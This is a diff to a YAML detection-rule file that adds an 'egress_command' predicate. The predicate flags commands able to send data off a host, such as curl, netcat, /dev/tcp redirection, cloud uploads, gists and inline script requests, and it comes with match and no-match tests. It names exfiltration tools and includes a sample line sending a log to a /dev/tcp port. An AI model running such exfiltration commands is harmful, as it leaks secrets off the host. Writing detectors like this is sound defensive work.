@@ -3,7 +3,10 @@
 # Eight rules ask it: secret-read-then-egress, browser-session-read-then-egress,
 # git-bundle-then-egress, secret-read-and-egress, env-dump-piped-to-network,
 # archive-then-upload, credentials-in-curl-data and upload-to-paste-transfer-site. Each says
-# what must be sent for it to matter; who sends is said here.
+# what must be sent for it to matter; who sends is said here. The two rules that follow a
+# read with any outbound command at all, secret-read-then-egress and
+# browser-session-read-then-egress, ask egress_command(e), which is every way out these
+# predicates know.
 #
 # The predicates over a command take one entry of e.command.parsed_commands, so they see a
 # sender by its name after sudo, env, timeout and the like, inside `bash -c`, and in any stage
@@ -149,3 +152,89 @@ definitions:
         events:
           - event: { action: command.executed }
             command: { command: "cat build.log > /dev/tcp/host.example/4444 )" }
+
+  - name: egress_command
+    params: [e]
+    description: >
+      A command event that can carry data off the host by any means: a network client
+      (egress_sender), a remote copy (egress_remote_copy), a /dev/tcp or /dev/udp redirection
+      (egress_dev_tcp), gh gist create, a cloud storage upload (aws s3, gsutil, gcloud
+      storage, az storage blob upload), an inline python, node, deno, bun, ruby, perl or php
+      script that makes a request, or PowerShell's web cmdlets. It asks who could send, not
+      what is sent: a rule that pairs it with a read says the two happened in one session. A
+      command line that does not parse is matched on its text.
+    body: >
+      e.event.action == "command.executed" && (
+        e.command.parsed_commands.exists(s,
+          egress_sender(s) ||
+          egress_remote_copy(s) ||
+          s.name == "gh" && s.argv.exists(a, a == "gist") && s.argv.exists(a, a == "create") ||
+          s.name.matches("(?i)^(python[0-9.]*|node|deno|bun|ruby|perl|php)$") &&
+            s.argv.exists(a, a in ["-c", "-e", "-r"]) &&
+            s.argv.exists(a, a.matches("(?i)(requests\\.(post|put|get|patch|request)\\(|urllib\\.request|urlopen\\(|http\\.client\\.|socket\\.create_connection\\(|\\.connect\\(\\(|fetch\\(|https?\\.(request|get)\\(|net::http\\.(get|post|start)|lwp::|fsockopen\\()")) ||
+          s.name == "aws" && s.argv.exists(a, a == "s3") && s.argv.exists(a, a in ["cp", "sync", "mv"]) ||
+          s.name == "gsutil" && s.argv.exists(a, a in ["cp", "rsync", "mv"]) ||
+          s.name == "gcloud" && s.argv.exists(a, a == "storage") && s.argv.exists(a, a in ["cp", "rsync", "mv"]) ||
+          s.name == "az" && s.argv.exists(a, a == "storage") && s.argv.exists(a, a == "blob") && s.argv.exists(a, a == "upload") ||
+          s.name.matches("(?i)^(pwsh|powershell)(\\.exe)?$") &&
+            s.argv.exists(a, a.matches("(?i)\\b(invoke-webrequest|invoke-restmethod|iwr|irm)\\b[^\\n]*https?://"))) ||
+        egress_dev_tcp(e) ||
+        (size(e.command.parsed_commands) == 0 && (
+          e.command.command.matches("(?i)\\bcurl\\s") ||
+          e.command.command.matches("(?i)\\b(curl|wget)\\b[^\\n]*https?://") ||
+          e.command.command.matches("(?i)\\bwget\\s") ||
+          e.command.command.matches("(?i)(^|[;&|(`'\"]|\\$\\()\\s*((sudo|doas|nohup|exec|env|command|nice|time)\\s+|timeout\\s+\\S+\\s+)*([^\\s;&|'\"]*/)?(nc|ncat|netcat|socat)\\s+\\S") ||
+          e.command.command.matches("(?i)\\b(nc|ncat|netcat|socat)\\s+-") ||
+          e.command.command.matches("/dev/(tcp|udp)/") ||
+          e.command.command.matches("(?i)(^|[;&|(`]|\\$\\()\\s*(sudo\\s+)?(scp|sftp|rsync)\\s([^;&|\\n]*\\s)?[\\w.@-]+:") ||
+          e.command.command.matches("(?i)\\b(python[0-9.]*|node|deno|bun|ruby|perl|php)\\s+(-c|-e|-r)\\s[\\s\\S]*(requests\\.(post|put|get|patch|request)\\(|urllib\\.request|urlopen\\(|http\\.client\\.|socket\\.create_connection\\(|\\.connect\\(\\(|fetch\\(|https?\\.(request|get)\\(|net::http\\.(get|post|start)|lwp::|fsockopen\\()") ||
+          e.command.command.matches("(?i)\\bgh\\s+gist\\s+create\\b") ||
+          e.command.command.matches("(?i)\\b(aws\\s+s3\\s+(cp|sync|mv)|gsutil\\s+(-m\\s+)?(cp|rsync|mv)|gcloud\\s+storage\\s+(cp|rsync|mv)|az\\s+storage\\s+blob\\s+upload)\\b") ||
+          e.command.command.matches("(?i)\\b(invoke-webrequest|invoke-restmethod|iwr|irm)\\b[^\\n]*https?://")))
+      )
+    tests:
+      - name: a_network_client
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "curl -s https://example.com/health" }
+      - name: a_cloud_storage_upload
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "aws s3 cp build.tgz s3://bucket.example/build.tgz" }
+      - name: a_gist
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "gh gist create notes.txt" }
+      - name: an_inline_script_request
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "python3 -c \"import requests; requests.post('https://example.com', data='x')\"" }
+      - name: a_command_line_that_does_not_parse
+        verdict: match
+        events:
+          - event: { action: command.executed }
+            command: { command: "curl example.com/upload -T build.tgz )" }
+      - name: a_local_command
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git status && go test ./..." }
+      - name: a_sender_named_in_a_commit_message
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "git commit -m 'retry curl https://example.com on failure'" }
+      - name: a_cloud_listing
+        verdict: no_match
+        events:
+          - event: { action: command.executed }
+            command: { command: "aws s3 ls s3://bucket.example/" }
+      - name: another_kind_of_event
+        verdict: no_match
+        events:
+          - event: { action: file.read }
+            file: { path: "/home/u/notes/curl.md" }
